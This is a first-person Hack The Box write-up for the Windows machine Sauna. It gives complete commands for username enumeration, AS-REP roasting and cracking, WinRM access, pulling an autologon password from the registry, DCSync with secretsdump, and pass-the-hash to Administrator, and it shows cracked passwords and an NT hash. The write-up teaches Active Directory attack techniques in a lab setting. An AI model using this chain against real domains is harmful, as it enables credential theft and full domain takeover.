# Hack The Box: Sauna

| Field | Value |
| --- | --- |
| Machine | Sauna (Windows, Easy) |
| Date | 26 September 2026 |
| Target for this session | `10.129.95.180` |
| Domain controller | `SAUNA.egotistical-bank.local` |
| Initial access | Employee names, AS-REP roasting, and WinRM as `fsmith` |
| Privilege escalation | Stored Winlogon credential, `svc_loanmgr` replication rights, and Administrator pass-the-hash |

The target IP belonged to this lab session and changes after a reset. Flag values are omitted.

## Reconnaissance

A service scan identified a Windows domain controller. The useful exposed services included DNS (53), Kerberos (88), LDAP (389), SMB (445), IIS (80), and WinRM (5985):

```bash
nmap -sC -sV -oN sauna-initial.nmap 10.129.95.180
echo '10.129.95.180 sauna.egotistical-bank.local egotistical-bank.local' >> /etc/hosts
```

The domain was `egotistical-bank.local`. Anonymous LDAP and SMB authentication did not provide a useful user list:

```bash
nxc ldap 10.129.95.180 -u '' -p '' --users
nxc smb 10.129.95.180 -u '' -p '' --users
```

The bank website served a contact form and an **About / Team** page. The team names gave plausible domain usernames, even though the contact form was not useful for initial access.

## Employee names and AS-REP roasting

I saved the employee names shown on the website and generated common username patterns:

```bash
printf '%s\n' \
  'Fergus Smith' \
  'Shaun Coins' \
  'Hugo Bear' \
  'Bowie Taylor' \
  'Sophie Driver' \
  'Steven Kerb' > fullnames.txt

awk 'NF >= 2 {
  first = tolower($1); last = tolower($NF)
  print first
  print substr(first, 1, 1) last
  print first "." last
  print first substr(last, 1, 1)
}' fullnames.txt | sort -u > users.txt

kerbrute userenum --dc 10.129.95.180 \
  -d egotistical-bank.local users.txt
```

Kerbrute confirmed `fsmith` and reported that the account did not require Kerberos pre-authentication. It returned an AS-REP hash using etype 18. This is encrypted password-derived material for **offline cracking**, not a password that can be used to log in.

I requested a fresh AS-REP with Impacket. The resulting `$krb5asrep$23$` hash matched Hashcat mode `18200`:

```bash
impacket-GetNPUsers 'egotistical-bank.local/fsmith' \
  -no-pass -dc-ip 10.129.95.180 \
  -format hashcat -outputfile fsmith.asrep

hashcat -m 18200 fsmith.asrep /usr/share/wordlists/rockyou.txt
hashcat -m 18200 --show fsmith.asrep
```

The password was `Thestrokes23`. Mode `18200` applies to the **etype 23** AS-REP obtained with Impacket; it is not the mode for Kerbrute's original etype 18 hash.

## FSmith: domain enumeration and WinRM

With a working domain credential, I enumerated users and SMB shares, then checked WinRM:

```bash
nxc ldap 10.129.95.180 -d egotistical-bank.local \
  -u fsmith -p 'Thestrokes23' --users

nxc smb 10.129.95.180 -d egotistical-bank.local \
  -u fsmith -p 'Thestrokes23' --shares

nxc winrm 10.129.95.180 -d egotistical-bank.local \
  -u fsmith -p 'Thestrokes23'
```

LDAP exposed the additional account `svc_loanmgr`. The `print$` share contained printer drivers; the writable RICOH entry was a printer queue. WinRM accepted `fsmith`:

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'
```

In the PowerShell session, `whoami /all` showed `Remote Management Users` and ordinary user privileges. The user flag was on FSmith's desktop:

```powershell
whoami /all
Get-ChildItem C:\Users -Force
Get-Content C:\Users\FSmith\Desktop\user.txt
```

The `C:\Users` listing also contained a profile for `svc_loanmgr`. A profile indicates that an account has been used on the machine; the `svc_` prefix and profile alone do **not** establish that automatic logon is configured.

## Stored Windows logon credential

Checking common Windows credential locations led to the machine-wide Winlogon settings. A host-enumeration tool such as winPEAS can identify automatic logon; in this session I read the registry values directly:

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' |
  Select-Object AutoAdminLogon, DefaultDomainName, DefaultUserName, DefaultPassword
```

The configuration exposed the password `Moneymakestheworldgoround!`. Its displayed username used `svc_loanmanager`, while LDAP and the profile showed the actual account name `svc_loanmgr`. I tested the password against that account and confirmed both SMB authentication and WinRM access:

```bash
nxc smb 10.129.95.180 -d egotistical-bank.local \
  -u svc_loanmgr -p 'Moneymakestheworldgoround!'

nxc winrm 10.129.95.180 -d egotistical-bank.local \
  -u svc_loanmgr -p 'Moneymakestheworldgoround!'

evil-winrm -i 10.129.95.180 -u svc_loanmgr \
  -p 'Moneymakestheworldgoround!'
```

`whoami /all` for `svc_loanmgr` showed the same ordinary local groups and privileges as FSmith. Local token privileges do not show permissions granted directly on Active Directory objects.

## Domain ACL and DCSync

I inspected the access list on the domain object from the `svc_loanmgr` PowerShell session:

```powershell
dsacls 'DC=egotistical-bank,DC=local' |
  Select-String 'svc_loanmgr' -Context 0,3
```

The domain object explicitly granted `svc_loanmgr` both **Replicating Directory Changes** and **Replicating Directory Changes All**. Together these rights allow a DCSync request: the account can request domain password data through the replication interface without belonging to Domain Admins.

From Kali, I requested only the Administrator account's secrets:

```bash
impacket-secretsdump -just-dc-user Administrator \
  'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'
```

The single quotes protect the `!` in the password from shell history expansion. Impacket used DRSUAPI and returned Administrator's RID 500 NT hash:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

The fourth colon-separated field is the NT hash. Obtaining it was the **DCSync** step; using it to authenticate was the next step.

## Administrator and root flag

Evil-WinRM accepted the Administrator NT hash:

```bash
evil-winrm -i 10.129.95.180 -u Administrator \
  -H '823452073d75b9d1cf70ebdf86c7f98e'
```

The shell identified the account as `egotisticalbank\administrator` and could read the root flag:

```powershell
whoami
Get-Content C:\Users\Administrator\Desktop\root.txt
```
